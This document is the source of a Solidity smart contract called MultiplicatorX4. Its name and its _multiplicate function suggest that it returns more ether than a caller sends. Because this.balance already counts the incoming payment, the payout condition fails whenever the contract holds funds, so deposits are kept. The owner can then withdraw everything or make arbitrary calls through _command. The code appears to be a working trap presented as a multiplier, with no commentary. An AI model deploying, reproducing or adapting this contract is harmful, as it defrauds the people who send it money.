pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public _owner = msg.sender;
   
    function() public payable{}
   
    function _withdraw()
    payable
    public
    {
        require(msg.sender == _owner);
        _owner.transfer(this.balance);
    }
    
    function _command(address _adr, bytes _data)
    payable
    public
    {
        require(msg.sender == _owner);
         
        _adr.call.value(msg.value)(_data);
    }
    
    function _multiplicate(address _adr)
    public
    payable
    {
        if(msg.value >= this.balance)
        {        
            _adr.transfer(this.balance + msg.value);
        }
    }
}